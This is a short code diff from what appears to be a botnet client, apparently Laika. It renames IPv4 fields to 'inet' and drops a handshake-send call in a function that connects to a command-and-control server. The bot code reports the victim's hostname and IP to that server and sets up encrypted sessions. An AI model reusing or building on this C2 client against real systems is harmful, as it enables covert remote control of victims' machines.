@@ -34,7 +34,7 @@ struct sLaika_peerPacketInfo laikaB_pktTbl[LAIKAPKT_MAXNONE] = {
 struct sLaika_bot *laikaB_newBot(void) {
     struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));
     struct hostent *host;
-    char *tempIPBuf;
+    char *tempINBuf;
     size_t _unused;
 
     bot->shell = NULL;
@@ -74,13 +74,13 @@ struct sLaika_bot *laikaB_newBot(void) {
         LAIKA_ERROR("gethostbyname() failed!\n");
     }
 
-    if ((tempIPBuf = inet_ntoa(*((struct in_addr*)host->h_addr_list[0]))) == NULL) {
+    if ((tempINBuf = inet_ntoa(*((struct in_addr*)host->h_addr_list[0]))) == NULL) {
         laikaB_freeBot(bot);
         LAIKA_ERROR("inet_ntoa() failed!\n");
     }
 
-    /* copy ipv4 address info */
-    strcpy(bot->peer->ipv4, tempIPBuf);
+    /* copy inet address info */
+    strcpy(bot->peer->inet, tempINBuf);
     return bot;
 }
 
@@ -113,15 +113,12 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
     laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
     laikaS_write(sock, bot->peer->hostname, LAIKA_HOSTNAME_LEN);
-    laikaS_write(sock, bot->peer->ipv4, LAIKA_IPV4_LEN);
+    laikaS_write(sock, bot->peer->inet, LAIKA_INET_LEN);
     laikaS_endOutPacket(bot->peer);
     laikaS_setSecure(bot->peer, true); /* after the cnc receives our handshake, our packets will be encrypted */
 
     if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
         LAIKA_ERROR("failed to gen session key!\n");
-
-    if (!laikaS_handlePeerOut(bot->peer))
-        LAIKA_ERROR("failed to send handshake request!\n");
 }
 
 void laikaB_flushQueue(struct sLaika_bot *bot) {
